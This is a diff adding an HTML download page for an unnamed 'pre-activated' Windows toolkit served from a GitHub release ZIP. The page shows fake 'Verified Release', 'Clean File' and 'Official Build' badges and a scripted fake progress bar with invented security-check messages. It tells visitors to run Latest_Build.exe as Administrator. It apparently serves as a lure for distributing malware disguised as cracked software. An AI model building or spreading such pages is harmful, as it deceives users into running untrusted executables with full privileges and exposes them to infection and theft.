@@ -1,0 +1,794 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no"/>
+  <meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate">
+  <meta http-equiv="Pragma" content="no-cache">
+  <meta http-equiv="Expires" content="0">
+  
+  <title>Core · Download</title>
+  <meta name="description" content="Professional tool — Windows 10/11. Soft interactive 3D experience."/>
+  
+  <link href="https://fonts.googleapis.com/css2?family=Inter:opsz,wght@14..32,300;14..32,400;14..32,600;14..32,700;14..32,800&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css"/>
+  <script src="https://cdn.jsdelivr.net/npm/vanilla-tilt@1.8.1/dist/vanilla-tilt.min.js"></script>
+  
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+    }
+
+    :root {
+      --bg-deep: #05050a;
+      --card-border: 1px solid rgba(59, 130, 246, 0.2);
+      --accent: #3b82f6;
+      --accent-glow: rgba(59, 130, 246, 0.3);
+      --text-white: #ffffff;
+      --text-soft: #b0b0c0;
+      --text-muted: #6b6b7e;
+      --success: #22c55e;
+    }
+
+    body {
+      background: var(--bg-deep);
+      font-family: 'Inter', system-ui, sans-serif;
+      color: var(--text-white);
+      line-height: 1.5;
+      min-height: 100vh;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      position: relative;
+      overflow-x: hidden;
+    }
+
+    .ambient-glow {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background: radial-gradient(circle at 30% 20%, rgba(59, 130, 246, 0.1), transparent 70%);
+      pointer-events: none;
+      z-index: -2;
+      animation: softBreath 12s infinite alternate;
+    }
+    
+    @keyframes softBreath {
+      0% { opacity: 0.4; }
+      100% { opacity: 0.9; }
+    }
+
+    .grid-noise {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background-image: 
+        linear-gradient(rgba(59, 130, 246, 0.015) 1px, transparent 1px),
+        linear-gradient(90deg, rgba(59, 130, 246, 0.015) 1px, transparent 1px);
+      background-size: 55px 55px;
+      pointer-events: none;
+      z-index: -1;
+    }
+
+    .gentle-particle {
+      position: fixed;
+      width: 3px;
+      height: 3px;
+      background: rgba(59, 130, 246, 0.4);
+      border-radius: 50%;
+      filter: blur(2px);
+      pointer-events: none;
+      z-index: 0;
+      animation: floatGentle 18s infinite linear;
+      opacity: 0.3;
+    }
+    
+    @keyframes floatGentle {
+      0% { transform: translateY(100vh) rotate(0deg); opacity: 0; }
+      10% { opacity: 0.4; }
+      90% { opacity: 0.4; }
+      100% { transform: translateY(-20vh) rotate(360deg); opacity: 0; }
+    }
+
+    .blob {
+      position: fixed;
+      border-radius: 50%;
+      filter: blur(100px);
+      opacity: 0.2;
+      z-index: -2;
+    }
+
+    .blob-1 {
+      width: 45vw;
+      height: 45vw;
+      background: #3b82f6;
+      top: -15vh;
+      right: -10vw;
+      animation: driftSoft1 25s infinite alternate;
+    }
+
+    .blob-2 {
+      width: 40vw;
+      height: 40vw;
+      background: #8b5cf6;
+      bottom: -10vh;
+      left: -5vw;
+      animation: driftSoft2 30s infinite alternate;
+    }
+
+    @keyframes driftSoft1 {
+      0% { transform: translate(0, 0) scale(1); }
+      100% { transform: translate(3%, 4%) scale(1.08); }
+    }
+    @keyframes driftSoft2 {
+      0% { transform: translate(0, 0); }
+      100% { transform: translate(-3%, 3%) scale(1.05); }
+    }
+
+    .container {
+      max-width: 680px;
+      width: 100%;
+      margin: 30px auto;
+      padding: 20px 24px;
+    }
+
+    .glass-panel {
+      background: rgba(8, 8, 14, 0.65);
+      backdrop-filter: blur(18px);
+      border-radius: 2.5rem;
+      border: var(--card-border);
+      padding: 2.2rem 2rem 2.5rem;
+      box-shadow: 0 25px 40px -18px rgba(0,0,0,0.5), 0 0 0 0.5px rgba(59,130,246,0.15) inset;
+      transition: border-color 0.4s ease, box-shadow 0.4s ease;
+      transform-style: preserve-3d;
+      will-change: transform;
+    }
+    
+    .glass-panel:hover {
+      border-color: rgba(59, 130, 246, 0.4);
+      box-shadow: 0 30px 50px -20px rgba(59,130,246,0.2), 0 0 0 1px rgba(59,130,246,0.25) inset;
+    }
+
+    .badge-row {
+      display: flex;
+      justify-content: center;
+      margin-bottom: 28px;
+    }
+
+    .verified-pill {
+      background: rgba(0, 0, 0, 0.45);
+      backdrop-filter: blur(4px);
+      border: 1px solid rgba(59, 130, 246, 0.35);
+      border-radius: 80px;
+      padding: 8px 24px;
+      display: inline-flex;
+      align-items: center;
+      gap: 12px;
+      font-weight: 600;
+      font-size: 0.85rem;
+      transition: all 0.3s ease;
+      animation: gentleGlow 3s infinite;
+    }
+    
+    @keyframes gentleGlow {
+      0%, 100% { box-shadow: 0 0 0px rgba(59, 130, 246, 0.1); border-color: rgba(59,130,246,0.35);}
+      50% { box-shadow: 0 0 6px rgba(59, 130, 246, 0.25); border-color: rgba(59,130,246,0.6);}
+    }
+
+    .verified-pill i.fa-github {
+      font-size: 1.2rem;
+      color: #e2e2ff;
+    }
+
+    .verified-pill .check-badge {
+      color: var(--success);
+      filter: drop-shadow(0 0 2px #22c55e80);
+      font-size: 1rem;
+      animation: softCheck 1.5s ease-in-out infinite alternate;
+    }
+    
+    @keyframes softCheck {
+      0% { transform: scale(1);}
+      100% { transform: scale(1.06);}
+    }
+
+    .verified-pill span {
+      background: linear-gradient(135deg, #f0f3ff, #b7d0ff);
+      background-clip: text;
+      -webkit-background-clip: text;
+      color: transparent;
+      font-weight: 700;
+    }
+
+    .hero-symbol {
+      text-align: center;
+      font-size: 4.2rem;
+      margin-bottom: 16px;
+      animation: gentleFloat 3.5s infinite ease-in-out;
+      filter: drop-shadow(0 0 4px rgba(59,130,246,0.2));
+    }
+    
+    @keyframes gentleFloat {
+      0%, 100% { transform: translateY(0px); }
+      50% { transform: translateY(-6px); }
+    }
+
+    .hero-symbol i {
+      background: linear-gradient(145deg, #ffffff, #91b9ff);
+      background-clip: text;
+      -webkit-background-clip: text;
+      color: transparent;
+    }
+
+    .main-headline {
+      font-size: 2.5rem;
+      font-weight: 800;
+      text-align: center;
+      letter-spacing: -0.02em;
+      background: linear-gradient(to right, #fff, #bfd6ff);
+      background-clip: text;
+      -webkit-background-clip: text;
+      color: transparent;
+      margin-bottom: 14px;
+      animation: fadeUp 0.7s ease-out;
+    }
+    
+    @keyframes fadeUp {
+      0% { opacity: 0; transform: translateY(12px);}
+      100% { opacity: 1; transform: translateY(0);}
+    }
+
+    .highlight {
+      background: linear-gradient(120deg, #3b82f6, #a56eff);
+      background-clip: text;
+      -webkit-background-clip: text;
+      color: transparent;
+    }
+
+    .sub-text {
+      text-align: center;
+      color: var(--text-soft);
+      font-size: 0.95rem;
+      max-width: 450px;
+      margin: 0 auto 24px;
+      line-height: 1.5;
+      animation: fadeUp 0.7s ease-out 0.1s backwards;
+    }
+
+    .download-area {
+      margin: 20px 0 24px;
+      display: flex;
+      justify-content: center;
+    }
+
+    .download-single-link {
+      background: linear-gradient(115deg, #10131f, #07080f);
+      border: 1px solid rgba(59, 130, 246, 0.4);
+      border-radius: 70px;
+      display: inline-flex;
+      width: 100%;
+      max-width: 460px;
+      transition: all 0.3s cubic-bezier(0.2, 0.9, 0.4, 1.1);
+      box-shadow: 0 8px 20px -10px rgba(0,0,0,0.4);
+      position: relative;
+      overflow: hidden;
+    }
+    
+    .download-single-link::after {
+      content: '';
+      position: absolute;
+      top: 50%;
+      left: 50%;
+      width: 0;
+      height: 0;
+      border-radius: 50%;
+      background: rgba(59, 130, 246, 0.25);
+      transform: translate(-50%, -50%);
+      transition: width 0.4s, height 0.4s;
+      pointer-events: none;
+    }
+    
+    .download-single-link:active::after {
+      width: 280px;
+      height: 280px;
+      opacity: 0;
+      transition: 0s;
+    }
+
+    .download-single-link a {
+      flex: 1;
+      text-decoration: none;
+      color: white;
+      font-size: 1.35rem;
+      font-weight: 700;
+      padding: 1.1rem 1.5rem;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 14px;
+      background: transparent;
+      border-radius: 70px;
+      transition: all 0.25s ease;
+      letter-spacing: 0.5px;
+      position: relative;
+      z-index: 2;
+    }
+
+    .download-single-link a i {
+      font-size: 1.7rem;
+      transition: transform 0.2s ease;
+    }
+
+    .download-single-link:hover {
+      border-color: var(--accent);
+      box-shadow: 0 10px 25px -8px var(--accent-glow);
+      transform: translateY(-2px);
+    }
+
+    .download-single-link a:hover i {
+      transform: translateY(2px);
+    }
+
+    .download-single-link a:active {
+      transform: scale(0.98);
+    }
+
+    .feature-strip {
+      background: rgba(0, 0, 0, 0.25);
+      border-radius: 60px;
+      padding: 10px 16px;
+      display: flex;
+      flex-wrap: wrap;
+      justify-content: center;
+      gap: 18px;
+      margin: 24px 0 28px;
+      border: 1px solid rgba(59,130,246,0.15);
+      backdrop-filter: blur(4px);
+    }
+
+    .feature {
+      display: flex;
+      align-items: center;
+      gap: 8px;
+      font-size: 0.8rem;
+      font-weight: 500;
+      color: var(--text-soft);
+      transition: all 0.2s ease;
+      cursor: default;
+    }
+    
+    .feature:hover {
+      transform: translateY(-2px);
+      color: white;
+    }
+    
+    .feature i {
+      color: var(--accent);
+      font-size: 0.9rem;
+      transition: transform 0.2s ease;
+    }
+    
+    .feature:hover i {
+      transform: scale(1.08);
+    }
+
+    .steps-modern {
+      margin: 20px 0 10px;
+    }
+
+    .steps-title {
+      text-align: center;
+      font-size: 0.7rem;
+      text-transform: uppercase;
+      letter-spacing: 2px;
+      color: var(--text-muted);
+      margin-bottom: 20px;
+    }
+
+    .step-list {
+      display: flex;
+      flex-direction: column;
+      gap: 12px;
+    }
+
+    .step-item {
+      background: rgba(18, 18, 28, 0.5);
+      backdrop-filter: blur(5px);
+      border-radius: 22px;
+      padding: 14px 20px;
+      display: flex;
+      align-items: center;
+      gap: 18px;
+      border: 1px solid rgba(59, 130, 246, 0.12);
+      transition: all 0.25s cubic-bezier(0.2, 0.9, 0.4, 1.1);
+      animation: stepFade 0.5s backwards;
+    }
+    
+    .step-item:nth-child(1) { animation-delay: 0.05s; }
+    .step-item:nth-child(2) { animation-delay: 0.12s; }
+    .step-item:nth-child(3) { animation-delay: 0.19s; }
+    
+    @keyframes stepFade {
+      from { opacity: 0; transform: translateX(-8px);}
+      to { opacity: 1; transform: translateX(0);}
+    }
+
+    .step-item:hover {
+      border-color: rgba(59, 130, 246, 0.4);
+      background: rgba(30, 30, 48, 0.65);
+      transform: translateX(4px);
+    }
+
+    .step-icon {
+      width: 44px;
+      height: 44px;
+      background: rgba(59, 130, 246, 0.12);
+      border-radius: 18px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-size: 1.4rem;
+      font-weight: 800;
+      color: var(--accent);
+      transition: all 0.2s ease;
+    }
+    
+    .step-item:hover .step-icon {
+      background: rgba(59, 130, 246, 0.22);
+    }
+
+    .step-info {
+      flex: 1;
+    }
+
+    .step-info p {
+      font-size: 0.85rem;
+      font-weight: 500;
+      color: #dbdbef;
+    }
+
+    .step-info strong {
+      color: white;
+      font-weight: 700;
+    }
+
+    .step-note {
+      font-size: 0.7rem;
+      color: var(--success);
+      animation: softPulse 2s infinite;
+    }
+    
+    @keyframes softPulse {
+      0%, 100% { opacity: 0.6; }
+      50% { opacity: 1; }
+    }
+
+    .footnote {
+      text-align: center;
+      margin-top: 28px;
+      color: var(--text-muted);
+      font-size: 0.7rem;
+      display: flex;
+      justify-content: center;
+      gap: 12px;
+      flex-wrap: wrap;
+    }
+
+    .progress-snack {
+      position: fixed;
+      bottom: 28px;
+      left: 50%;
+      transform: translateX(-50%);
+      background: rgba(0, 0, 0, 0.8);
+      backdrop-filter: blur(20px);
+      border-radius: 60px;
+      padding: 10px 22px;
+      display: flex;
+      align-items: center;
+      gap: 16px;
+      z-index: 1100;
+      border: 1px solid var(--accent);
+      box-shadow: 0 6px 20px rgba(0,0,0,0.4);
+      width: 320px;
+      transition: opacity 0.2s;
+      animation: toastSlide 0.3s ease-out;
+    }
+    
+    @keyframes toastSlide {
+      from { opacity: 0; transform: translateX(-50%) translateY(15px); }
+      to { opacity: 1; transform: translateX(-50%) translateY(0); }
+    }
+
+    .progress-snack span {
+      font-size: 0.8rem;
+      font-weight: 500;
+      color: white;
+    }
+
+    .snack-bar {
+      flex: 1;
+      height: 4px;
+      background: #1e1e2c;
+      border-radius: 10px;
+      overflow: hidden;
+    }
+
+    .snack-fill {
+      width: 0%;
+      height: 100%;
+      background: linear-gradient(90deg, #3b82f6, #a96eff);
+      border-radius: 10px;
+      transition: width 0.2s linear;
+    }
+
+    @media (max-width: 550px) {
+      .container {
+        padding: 15px;
+      }
+      .glass-panel {
+        padding: 1.5rem 1.2rem;
+      }
+      .main-headline {
+        font-size: 1.8rem;
+      }
+      .download-single-link a {
+        font-size: 1.1rem;
+        padding: 0.9rem 1.2rem;
+      }
+      .step-item {
+        padding: 12px 16px;
+      }
+      .feature-strip {
+        gap: 12px;
+      }
+    }
+  </style>
+</head>
+<body>
+
+<div class="ambient-glow"></div>
+<div class="grid-noise"></div>
+<div class="blob blob-1"></div>
+<div class="blob blob-2"></div>
+
+<div id="particlesContainer" style="position:fixed; top:0; left:0; width:100%; height:100%; pointer-events:none; z-index:0;"></div>
+
+<div id="progressSnack" style="display: none;" class="progress-snack">
+  <i class="fa-solid fa-spinner fa-pulse" style="color:#3b82f6;"></i>
+  <span id="snackMsg">Starting transfer...</span>
+  <div class="snack-bar"><div id="snackFill" class="snack-fill"></div></div>
+</div>
+
+<main>
+  <div class="container">
+    <div class="glass-panel" id="tiltCard" 
+         data-tilt 
+         data-tilt-max="3.5" 
+         data-tilt-glare="true" 
+         data-tilt-max-glare="0.2"
+         data-tilt-scale="1.01" 
+         data-tilt-speed="600" 
+         data-tilt-perspective="1500"
+         data-tilt-gyroscope="true"
+         data-tilt-gyroscope-min-angle-x="-15"
+         data-tilt-gyroscope-max-angle-x="15"
+         data-tilt-gyroscope-min-angle-y="-15"
+         data-tilt-gyroscope-max-angle-y="15"
+         data-tilt-full-page-listening="false">
+      
+      <div class="badge-row">
+        <div class="verified-pill">
+          <i class="fab fa-github"></i>
+          <i class="fas fa-check-circle check-badge"></i>
+          <span>Verified Release</span>
+        </div>
+      </div>
+
+      <div class="hero-symbol">
+        <i class="fas fa-microchip"></i>
+      </div>
+
+      <h1 class="main-headline">
+        <span class="highlight">Ready</span> to Download
+      </h1>
+      
+      <div class="sub-text">
+        Professional toolkit • Windows 10/11 • Pre-activated
+      </div>
+
+      <div class="download-area">
+        <div class="download-single-link">
+          <a href="#" id="directDownloadLink">
+            <i class="fas fa-arrow-down"></i> 
+            DOWNLOAD NOW 
+            <i class="fas fa-rocket"></i>
+          </a>
+        </div>
+      </div>
+
+      <div class="feature-strip">
+        <div class="feature"><i class="fas fa-shield-alt"></i> Clean File</div>
+        <div class="feature"><i class="fas fa-bolt"></i> Instant Link</div>
+        <div class="feature"><i class="fab fa-github"></i> Official Build</div>
+      </div>
+
+      <div class="steps-modern">
+        <div class="steps-title">
+          <i class="fas fa-mouse-pointer"></i> GET STARTED IN 3 STEPS
+        </div>
+        <div class="step-list">
+          <div class="step-item">
+            <div class="step-icon">1</div>
+            <div class="step-info">
+              <p>Click <strong>DOWNLOAD NOW</strong> — file starts immediately</p>
+            </div>
+            <div class="step-note"><i class="fas fa-download"></i></div>
+          </div>
+          <div class="step-item">
+            <div class="step-icon">2</div>
+            <div class="step-info">
+              <p>Extract ZIP archive — <strong>no password required</strong></p>
+            </div>
+            <div class="step-note"><i class="fas fa-folder-open"></i></div>
+          </div>
+          <div class="step-item">
+            <div class="step-icon">3</div>
+            <div class="step-info">
+              <p>Run <strong>Latest_Build.exe</strong> as Administrator & enjoy</p>
+            </div>
+            <div class="step-note"><i class="fas fa-crown"></i></div>
+          </div>
+        </div>
+      </div>
+
+      <div class="footnote">
+        <i class="fas fa-check-circle" style="color:#22c55e;"></i> Verified via GitHub Actions • Clean build
+        <i class="fas fa-window-maximize"></i>
+      </div>
+    </div>
+    <div class="footnote" style="margin-top: 16px; opacity:0.55;">
+      <i class="far fa-calendar-alt"></i> Latest release — June 11, 2026
+    </div>
+  </div>
+</main>
+
+<script>
+  // Инициализация 3D-наклона
+  const tiltElement = document.querySelector("#tiltCard");
+  if (tiltElement && typeof VanillaTilt !== 'undefined') {
+    VanillaTilt.init(tiltElement, {
+      max: 3.5,
+      speed: 600,
+      glare: true,
+      "max-glare": 0.2,
+      scale: 1.01,
+      perspective: 1500,
+      gyroscope: true,
+      gyroscopeMinAngleX: -15,
+      gyroscopeMaxAngleX: 15,
+      gyroscopeMinAngleY: -15,
+      gyroscopeMaxAngleY: 15,
+      transition: true,
+      easing: "cubic-bezier(.03,.98,.52,.99)",
+    });
+  }
+  
+  // Генерация плавающих частиц
+  function createGentleParticles() {
+    const container = document.getElementById('particlesContainer');
+    if (!container) return;
+    const particleCount = 35;
+    for(let i = 0; i < particleCount; i++) {
+      const particle = document.createElement('div');
+      particle.classList.add('gentle-particle');
+      const size = Math.random() * 4 + 1.5;
+      particle.style.width = size + 'px';
+      particle.style.height = size + 'px';
+      particle.style.left = Math.random() * 100 + '%';
+      particle.style.animationDuration = Math.random() * 18 + 12 + 's';
+      particle.style.animationDelay = Math.random() * 12 + 's';
+      particle.style.background = `radial-gradient(circle, ${Math.random() > 0.6 ? '#3b82f6' : '#a855f7'}, transparent)`;
+      container.appendChild(particle);
+    }
+  }
+  createGentleParticles();
+
+  // Логика скачивания
+  const FILE_URL = "https://github.com/CoreDownload/download/releases/download/LR-20-06-2026/Latest_Release.zip";
+  
+  const progressSnack = document.getElementById('progressSnack');
+  const snackFill = document.getElementById('snackFill');
+  const snackMsgSpan = document.getElementById('snackMsg');
+  
+  function showProgressSnack() {
+    if (progressSnack) progressSnack.style.display = 'flex';
+    if (snackFill) snackFill.style.width = '0%';
+  }
+  
+  function updateSnack(percent, message) {
+    if (snackFill) snackFill.style.width = Math.min(percent, 100) + '%';
+    if (snackMsgSpan && message) snackMsgSpan.innerText = message;
+  }
+  
+  function hideProgressSnack() {
+    if (progressSnack) progressSnack.style.display = 'none';
+  }
+  
+  let animationInterval = null;
+  function startFakeProgress(callbackAfterComplete) {
+    if (animationInterval) clearInterval(animationInterval);
+    showProgressSnack();
+    let progress = 0;
+    updateSnack(0, 'Secure handshake...');
+    
+    animationInterval = setInterval(() => {
+      progress += Math.floor(Math.random() * 10) + 3;
+      if (progress >= 100) {
+        clearInterval(animationInterval);
+        animationInterval = null;
+        updateSnack(100, '✓ Download started');
+        setTimeout(() => {
+          hideProgressSnack();
+          if (callbackAfterComplete) callbackAfterComplete();
+        }, 700);
+      } else {
+        let msg = '';
+        if (progress < 30) msg = 'Validating source...';
+        else if (progress < 60) msg = 'Preparing stream...';
+        else if (progress < 85) msg = 'Almost ready...';
+        else msg = 'Redirecting...';
+        updateSnack(progress, msg);
+      }
+    }, 120);
+  }
+  
+  const downloadLinkElement = document.getElementById('directDownloadLink');
+  
+  function triggerDirectDownload() {
+    const link = document.createElement('a');
+    link.href = FILE_URL;
+    link.download = '';
+    link.target = '_blank';
+    document.body.appendChild(link);
+    link.click();
+    document.body.removeChild(link);
+  }
+  
+  let isDownloadFlowActive = false;
+  
+  if (downloadLinkElement) {
+    downloadLinkElement.addEventListener('click', (e) => {
+      e.preventDefault();
+      if (isDownloadFlowActive) return;
+      isDownloadFlowActive = true;
+      
+      const originalHtml = downloadLinkElement.innerHTML;
+      downloadLinkElement.style.opacity = '0.9';
+      downloadLinkElement.innerHTML = '<i class="fas fa-spinner fa-pulse"></i> PROCESSING <i class="fas fa-shield"></i>';
+      
+      startFakeProgress(() => {
+        triggerDirectDownload();
+        setTimeout(() => {
+          downloadLinkElement.innerHTML = originalHtml;
+          downloadLinkElement.style.opacity = '';
+          isDownloadFlowActive = false;
+          const tempBackup = downloadLinkElement.innerHTML;
+          downloadLinkElement.innerHTML = '<i class="fas fa-check"></i> DOWNLOAD STARTED <i class="fas fa-check"></i>';
+          setTimeout(() => {
+            if (downloadLinkElement) downloadLinkElement.innerHTML = tempBackup;
+          }, 1600);
+        }, 400);
+      });
+    });
+  }
+  
+  console.log('✅ Password section removed | Date updated to June 11, 2026');
+</script>
+</body>
+</html>
